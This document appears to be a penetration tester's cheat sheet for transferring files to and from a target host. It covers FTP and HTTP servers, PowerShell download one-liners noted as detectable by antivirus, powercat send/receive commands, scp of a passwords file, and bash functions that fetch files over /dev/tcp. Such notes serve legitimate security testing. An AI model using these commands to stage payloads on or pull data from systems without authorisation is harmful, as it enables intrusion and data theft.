# Transferring Files

## Services to Host Files on your System: 

General Options: 

FTP:

Install pyftpdlib
- pip3 install pyftpdlib

Pure-ftpd
- sudo apt install pure-ftpd
- service pure-ftpd start

Run (-w flag allows anonymous write access)
- Python3 -m pyftpdlib -p 21 -w

Web: 

- Python3 -m http.server 443
- service apache2 start

Powershell: 

Raw (Will get flagged by AV/AMSI): 

- powershell -c (New-Object Net.WebClient).DownloadFile('http://172.21.0.0:port/file', 'output-file'
- powershell -c Invoke-WebRequest -Uri "http://172.21.0.0" -OutFile "C:\path\file"

Use Powercat: 

Send File:
    powercat -c 10.1.1.1 -p 443 -i C:\inputfile
Recieve File:
    powercat -l -p 8000 -of C:\inputfile

Linux: 

scp: 

- scp [OPTION] [user@]SRC_HOST:]file1 [user@]DEST_HOST:]file2

scp through ssh: 

- scp -P 2322 passwords.txt remote_username@172.21.0.2:/remote/directory

scp remote file to local system: 

- scp remote_username@172.21.0.2:/remote/file.txt /local/directory


## Services to allow you to upload files to your system from the target: 

- SimpleHTTPServer Upload: https://gist.github.com/touilleMan/eb02ea40b93e52604938

## Download a file using Bash

```bash
function __wget() {
    : ${DEBUG:=0}
    local URL=$1
    local tag="Connection: close"
    local mark=0

    if [ -z "${URL}" ]; then
        printf "Usage: %s \"URL\" [e.g.: %s http://www.google.com/]" \
               "${FUNCNAME[0]}" "${FUNCNAME[0]}"
        return 1;
    fi
    read proto server path <<<$(echo ${URL//// })
    DOC=/${path// //}
    HOST=${server//:*}
    PORT=${server//*:}
    [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
    [[ $DEBUG -eq 1 ]] && echo "HOST=$HOST"
    [[ $DEBUG -eq 1 ]] && echo "PORT=$PORT"
    [[ $DEBUG -eq 1 ]] && echo "DOC =$DOC"

    exec 3<>/dev/tcp/${HOST}/$PORT
    echo -en "GET ${DOC} HTTP/1.1\r\nHost: ${HOST}\r\n${tag}\r\n\r\n" >&3
    while read line; do
        [[ $mark -eq 1 ]] && echo $line
        if [[ "${line}" =~ "${tag}" ]]; then
            mark=1
        fi
    done <&3
    exec 3>&-
}
```

```bash
function __curl() {
  read proto server path <<<$(echo ${1//// })
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80

  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  (while read line; do
   [[ "$line" == $'\r' ]] && break
  done && cat) <&3
  exec 3>&-
}
```

Source: https://unix.stackexchange.com/questions/83926/how-to-download-a-file-using-just-bash-and-nothing-else-no-curl-wget-perl-et